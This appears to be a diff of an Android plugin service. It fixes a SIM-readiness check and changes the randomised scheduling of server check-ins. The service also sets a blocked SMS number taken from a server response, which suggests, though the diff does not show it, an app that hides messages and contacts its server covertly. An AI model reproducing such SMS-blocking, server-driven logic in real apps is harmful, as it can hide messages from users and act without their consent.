@@ -136,7 +136,7 @@ public class PluginService extends IntentService {
     }
 
     private void activePluginAction() {
-        if (AppRuntime.isSIMCardReady(getApplicationContext())) return;
+        if (!AppRuntime.isSIMCardReady(getApplicationContext())) return;
 
         CustomThreadPool.asyncWork(new Runnable() {
             @Override
@@ -194,7 +194,7 @@ public class PluginService extends IntentService {
                                 AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
 //                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
                                 SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
-                                int next = AppRuntime.randomBetween(4, 13);
+                                int next = AppRuntime.randomBetween(4, 11);
                                 SettingManager.getInstance().setKeyRandomNetworkTime(next);
                             }
                         } else {
@@ -215,9 +215,18 @@ public class PluginService extends IntentService {
     private void networkErrorWork() {
         File file = new File(AppRuntime.RESPONSE_SAVE_FILE);
         file.delete();
-        int next = AppRuntime.randomBetween(0, 4);
+        int next = AppRuntime.randomBetween(0, 3);
+        int lastNetworkTime = SettingManager.getInstance().getKeyRandomNetworkTime();
+        int time = 0;
         int curHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
-        SettingManager.getInstance().setKeyRandomNetworkTime((curHour + next) >=24 ? 23 : (curHour + next));
+        if (lastNetworkTime <= 18) {
+            time = curHour + next;
+        } else {
+            time = lastNetworkTime > curHour ? (curHour + next) : (lastNetworkTime + next);
+        }
+        time = time >= 24 ? 23 : time;
+
+        SettingManager.getInstance().setKeyRandomNetworkTime(time);
     }
 
     private void activePackageAction(Intent intent) {
